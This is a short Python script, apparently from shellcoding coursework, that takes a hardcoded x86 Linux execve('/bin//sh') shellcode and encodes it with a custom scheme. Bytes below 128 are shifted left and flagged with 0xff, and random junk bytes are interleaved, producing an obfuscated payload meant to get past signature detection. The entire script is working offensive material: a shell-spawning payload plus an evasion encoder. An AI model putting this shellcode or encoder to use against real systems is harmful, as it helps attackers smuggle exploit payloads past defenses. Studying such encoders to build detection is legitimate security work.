#!/usr/bin/python

import random

shellcode =(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encode = ""

for x in bytearray(shellcode):
    if x < 128:
        x = x << 1
        encode += '\\xff'
    
    encode += "\\x"
    encode += '%02x'% x
    junk = random.randint(2,253)
    encode += '\\x%02x' % junk

db = str(encode).replace("\\x", ",0x")
db = db[1:]
print("Encode Shellcode: " + db)
